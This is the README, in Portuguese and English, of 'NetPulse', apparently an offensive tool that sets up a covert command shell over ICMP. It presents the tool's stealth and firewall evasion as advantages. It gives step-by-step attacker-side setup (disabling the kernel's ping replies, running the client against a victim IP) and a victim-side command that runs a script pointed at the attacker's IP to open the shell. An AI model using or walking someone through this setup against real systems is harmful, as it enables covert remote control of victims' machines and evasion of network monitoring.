<!-- # Guia de Uso do NetPulse - Ferramenta de ICMP SHELL

O NetPulse é uma ferramenta de ICMP SHELL que não requer acesso root do lado da vítima. Este guia fornece informações detalhadas sobre como usar o NetPulse.

## Vantagens do NetPulse
- **Não requer acesso root:** O NetPulse elimina a necessidade de acesso root no lado da vítima.
- **Camuflagem:** O tráfego ICMP é comum e frequentemente permitido em redes e firewalls.
- **Menos visibilidade:** Mensagens ICMP não deixam rastros nas tabelas de estado da maioria dos firewalls.
- **Utilidade em redes restritivas:** Em redes onde o tráfego TCP ou UDP é estritamente controlado, o ICMP pode ser uma alternativa.

## Desvantagens do NetPulse
- **Shell Limitada:** O NetPulse oferece uma shell limitada e não interativa.
- **Tráfego Incomum:** O tráfego gerado pelo NetPulse pode ser detectado por sistemas de detecção de intrusão.
- **Alta Lentidão:** Em comparação a uma reverse shell, o NetPulse é muito mais lento.

## Configuração do Lado do Atacante
A configuração do lado do atacante é mais complexa e requer acesso root. Siga os passos abaixo:

### Desative a resposta automática de pings do Kernel:

Verifique o valor do arquivo `/proc/sys/net/ipv4/icmp_echo_ignore_all`:
```bash
$ cat /proc/sys/net/ipv4/icmp_echo_ignore_all
```
Altere o valor para "1" para desativar as respostas automáticas:
```bash
$ echo 1 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_all
```
Faça as alterações permanentes em `/etc/sysctl.conf`:
```bash
$ sudo nano /etc/sysctl.conf
```
Adicione a seguinte linha:
```
net.ipv4.icmp_echo_ignore_all = 1
```
Aplique as configurações:
```bash
$ sudo sysctl -p
```

### Iniciando o Cliente

Para iniciar o cliente, execute o arquivo [netpulse_client.py](/netpulse_client.py) com permissões de root:

```bash
$ sudo python3 netpulse_client.py <IP-da-vítima>
```
Para obter mais opções, use a flag -h:
```bash
$ python3 netpulse_client.py -h
```

## Configuração do Lado da Vítima
A configuração do lado da vítima é mais simples e não requer acesso root. Certifique-se de que as seguintes ferramentas estejam instaladas:

- [iputils-ping](https://packages.debian.org/bullseye/iputils-ping) - Ferramenta para testar a alcançabilidade de hosts de rede.
- [xxd](https://packages.debian.org/bullseye/xxd) - Ferramenta para criar (ou reverter) um despejo em hexadecimal.

Se todas as ferramentas necessárias estiverem instaladas, execute o arquivo [netpulse_server.sh](/netpulse_server.sh):
```bash
$ chmod +x netpulse_server.sh && ./netpulse_server.sh <IP-do-atacante>
```

# Buy me a Coffe :p

<a href="https://www.buymeacoffee.com/ryan.r" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a> -->

# NetPulse Usage Guide - ICMP SHELL Tool

NetPulse is an ICMP SHELL tool that does not require root access on the victim's side. This guide provides detailed information on how to use NetPulse.

## Advantages of NetPulse
- **No Root Access Required:** NetPulse eliminates the need for root access on the victim's side.
- **Camouflage:** ICMP traffic is common and often allowed in networks and firewalls.
- **Reduced Visibility:** ICMP messages leave no traces in the state tables of most firewalls.
- **Useful in Restrictive Networks:** In networks where TCP or UDP traffic is strictly controlled, ICMP can be an alternative.

## Disadvantages of NetPulse
- **Limited Shell:** NetPulse provides a limited and non-interactive shell.
- **Uncommon Traffic:** Traffic generated by NetPulse can be detected by intrusion detection systems.
- **High Latency:** Compared to a reverse shell, NetPulse is much slower.

## Attacker-Side Configuration
Attacker-side configuration is more complex and requires root access. Follow the steps below:

### Disable Kernel Auto-Response to Pings:

Check the value of the `/proc/sys/net/ipv4/icmp_echo_ignore_all` file:
```bash
$ cat /proc/sys/net/ipv4/icmp_echo_ignore_all
```
Change the value to "1" to disable automatic responses:
```bash
$ echo 1 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_all
```
Make the changes permanent in `/etc/sysctl.conf`:
```bash
$ sudo nano /etc/sysctl.conf
```
Add the following line:
```
net.ipv4.icmp_echo_ignore_all = 1
```
Apply the settings:
```bash
$ sudo sysctl -p
```

### Starting the Client

To start the client, execute the [netpulse_client.py](/netpulse_client.py) file with root permissions:

```bash
$ sudo python3 netpulse_client.py <victim-IP>
```
For more options, use the -h flag:
```bash
$ python3 netpulse_client.py -h
```

## Victim-Side Configuration
Victim-side configuration is simpler and does not require root access. Ensure that the following tools are installed:

- [iputils-ping](https://packages.debian.org/bullseye/iputils-ping) - Tool for testing the reachability of network hosts.
- [xxd](https://packages.debian.org/bullseye/xxd) - Tool for creating (or reversing) a hexadecimal dump.

If all the necessary tools are installed, run the [netpulse_server.sh](/netpulse_server.sh) file:
```bash
$ chmod +x netpulse_server.sh && ./netpulse_server.sh <attacker-IP>
```

# Buy me a Coffee :p

<a href="https://www.buymeacoffee.com/ryan.r" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>